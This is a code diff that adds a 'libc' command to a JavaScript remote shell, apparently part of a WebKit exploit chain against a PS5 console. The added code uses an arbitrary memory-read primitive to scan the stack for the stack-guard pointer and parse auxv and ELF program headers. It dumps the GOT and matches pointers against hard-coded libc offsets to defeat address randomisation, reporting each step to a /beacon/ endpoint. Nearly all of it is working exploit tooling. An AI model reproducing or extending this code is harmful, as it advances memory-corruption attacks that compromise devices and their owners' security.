@@ -5497,6 +5497,144 @@ function _startWsShell(){
         break;
       }
 
+      case 'libc':{
+        /* THE LIBC IDENTIFIER: one command, the whole chain.
+         * (1) Stack scan [cfr, cfr+0x2000): find the guard pointer
+         *     (a lk+0x751D0 pointer: lk_base = guard - 0x751D0),
+         *     the auxv (AT_PHDR type 3 / AT_PHNUM 5 / AT_ENTRY 9 /
+         *     AT_BASE 7 pairs), and module pointer classes.
+         * (2) Read the phdrs ON THE STACK (AT_PHDR, phnum*0x38
+         *     bytes - stack memory, always readable). The PT_LOAD
+         *     entries give the main module's real segment map.
+         * (3) The data segment vaddr -> dump the GOT region ->
+         *     collect foreign (non-WebKit/libkernel/cage/stack)
+         *     pointers -> offset-match against the known libc
+         *     function offsets (the game lane addrofs table):
+         *     base = P - F, 16KB-aligned, multiple agreeing = libc.
+         * (4) Report libc base candidates + read the import window
+         *     [libc+0x114000, +0x118000) if confirmed (the 1213a
+         *     harvest region: 96 lk stub pointers). */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function LB(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('LIBC-'+s),false);x.send();}catch(e){}}
+        try{
+          var cfr=S.cfr;
+          /* (1) the stack scan: lk via the __stack_chk_guard address.
+           * The guard = lk+0x751D0; lk is 16KB-aligned so the guard
+           * residue mod 0x4000 = 0x751D0 & 0x3FFF = 0x11D0. Verify by
+           * companion count (lk+0x75101 errno-adjacent, lk+0x6C100
+           * threadlist-adjacent, and any other lk-range values). */
+          var stk=S.absRead(cfr,0x2000);
+          var guard=0n,lk=0n,phdr=0n,phnum=0,entry=0n,atbase=0n;
+          var bestLk=0n,bestComp=-1;
+          for(var si=0;si<stk.length;si++){
+            var v=stk[si];
+            if(v>0x800000000n&&v<0x900000000n&&(v&0x3FFFn)===0x11D0n){
+              var cand=v-0x751D0n;
+              if((cand&0x3FFFn)===0n&&cand>0x800000000n){
+                var comp=0;
+                for(var cj=0;cj<stk.length;cj++){
+                  var w=stk[cj];
+                  if(w>cand&&w<cand+0x100000n)comp++;
+                }
+                if(comp>bestComp){bestComp=comp;bestLk=cand;guard=v;}
+              }
+            }
+          }
+          lk=bestLk;
+          LB('1 lk=0x'+lk.toString(16)+' guard=0x'+guard.toString(16)+' companions='+bestComp);
+          if(lk===0n){reply.err='guard not found on stack';break;}
+          /* auxv scan: pairs (type,value): 3=AT_PHDR, 5=AT_PHNUM, 9=AT_ENTRY, 7=AT_BASE */
+          for(var ai=0;ai<stk.length-1;ai++){
+            var t=stk[ai];
+            if(t===3n){phdr=stk[ai+1];}
+            else if(t===5n){phnum=Number(stk[ai+1]);}
+            else if(t===9n){entry=stk[ai+1];}
+            else if(t===7n&&stk[ai+1]>0x100000000n){atbase=stk[ai+1];}
+          }
+          LB('2 phdr=0x'+phdr.toString(16)+' phnum='+phnum+' entry=0x'+entry.toString(16)+' atbase=0x'+atbase.toString(16));
+          if(phdr===0n||phnum===0){reply.err='auxv not found on stack';break;}
+          reply.lk='0x'+lk.toString(16);
+          reply.entry='0x'+entry.toString(16);
+          reply.atbase='0x'+atbase.toString(16);
+          /* (2) the phdrs on the stack: p_type,p_flags,p_offset,p_vaddr,p_paddr,p_filesz,p_memsz,p_align (56 bytes) */
+          var phdrs=S.absRead(phdr,BigInt(phnum*0x38));
+          var loads=[];
+          for(var pi2=0;pi2<phnum;pi2++){
+            var off=BigInt(pi2*0x38);
+            var q=S.absRead(phdr+off,0x38);
+            /* qwords: [0]=type|flags, [1]=offset|paddr, [2]=vaddr|filesz ... careful: fields are 8/4 mixed.
+             * ELF64 phdr: p_type(u32) p_flags(u32) | p_offset(u64) | p_vaddr(u64) | p_paddr(u64) | p_filesz(u64) | p_memsz(u64) | p_align(u64)
+             * => qword0 = type|flags<<32, qword1 = offset, qword2 = vaddr, qword3 = paddr, qword4 = filesz, qword5 = memsz, qword6 = align */
+            var ptype=Number(q[0]&0xFFFFFFFFn);
+            var vaddr=q[2],filesz=q[4],memsz=q[5];
+            loads.push({type:ptype,vaddr:'0x'+vaddr.toString(16),filesz:'0x'+filesz.toString(16),memsz:'0x'+memsz.toString(16),raw:vaddr});
+            LB('3 ph'+pi2+' type='+ptype+' vaddr=0x'+vaddr.toString(16)+' memsz=0x'+memsz.toString(16));
+          }
+          reply.phdrs=loads;
+          /* (3) the main module data segment: the highest PT_LOAD vaddr.
+           * PS5 SELF phdr vaddrs may be module-relative: if the vaddr is
+           * small (< 0x400000) treat it as relative to mainBase =
+           * entry - 0x4070 (the entry offset proven across two boots). */
+          var mainBase=entry-0x4070n;
+          LB('4 mainBase=0x'+mainBase.toString(16));
+          var dataSeg=null;
+          var maxV=-1n;
+          for(var li=0;li<loads.length;li++){
+            if(loads[li].type===1){
+              var av=loads[li].raw;
+              if(av<0x400000n)av=mainBase+av; /* module-relative phdr */
+              loads[li].absV=av;
+              if(av>maxV){maxV=av;dataSeg=loads[li];}
+            }
+          }
+          LB('5 dataSeg abs=0x'+(dataSeg?dataSeg.absV.toString(16):'?'));
+          if(!dataSeg){reply.err='no PT_LOAD found';break;}
+          /* GOT dump: the RW segment start page (mapped - the loader
+           * wrote the GOT there; phdr vaddrs mark mapped segments) */
+          var gotStart=dataSeg.absV&~0x3FFFn;
+          var got=S.absRead(gotStart,0x1000);
+          /* foreign pointer filter + libc offset match */
+          var KNOWN={0x168:'error',0x198:'sceKernelGetModuleInfoFromAddr',0x366E0:'strerror',0x37BF0:'Atomic_fetch_add_8',0x42410:'memcpy',0x4C1C0:'Thrd_join',0x4C240:'Thrd_exit',0x4C3C0:'Thrd_create',0x4C650:'Mtx_init',0x4C6E0:'Mtx_unlock',0x4C6F0:'Mtx_lock',0x4CDB0:'calloc',0xB0020:'setjmp',0xB0070:'longjmp'};
+          var votes={};
+          var gotForeign=[];
+          for(var gi=0;gi<got.length;gi++){
+            var p=got[gi];
+            if(p>0x100000000n&&p<0x900000000n){
+              gotForeign.push('0x'+p.toString(16));
+              for(var fk in KNOWN){
+                var base=p-BigInt(fk);
+                if(base>0x100000000n&&base<0x900000000n&&(base&0x3FFFn)===0n){
+                  var bk=base.toString(16);
+                  if(!votes[bk])votes[bk]=[];
+                  votes[bk].push(KNOWN[fk]);
+                }
+              }
+            }
+          }
+          reply.gotForeign=gotForeign.slice(0,80);
+          /* the winner: most votes */
+          var best=null,bestN=0;
+          for(var vk in votes){if(votes[vk].length>bestN){bestN=votes[vk].length;best=vk;}}
+          LB('5 got n='+gotForeign.length+' best='+(best?('0x'+best+' n='+bestN+' ['+votes[best].join(',')+']'):'none'));
+          reply.libcVotes=votes;
+          reply.libcBest=best?('0x'+best+' n='+bestN):'none';
+          /* (4) if a confident base (>=2 votes), read the import window */
+          if(best&&bestN>=2){
+            var libcBase=BigInt('0x'+best);
+            var win=S.absRead(libcBase+0x114000n,0x2000);
+            var stubs=[];
+            for(var wi=0;wi<win.length;wi++){
+              var w=win[wi];
+              if(w>lk&&w<lk+0x100000n){stubs.push('0x'+(w-lk).toString(16));}
+            }
+            LB('6 WINDOW stubs='+stubs.length);
+            reply.windowStubs=stubs;
+            reply.libc='0x'+libcBase.toString(16);
+          }
+        }catch(e2){reply.err='libc fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
       case 'tw':{
         /* THE THREAD WITNESS (the game lane's 56l probe ported): the
          * thr_new candidate (export entry #msg.idx) called with a FULLY
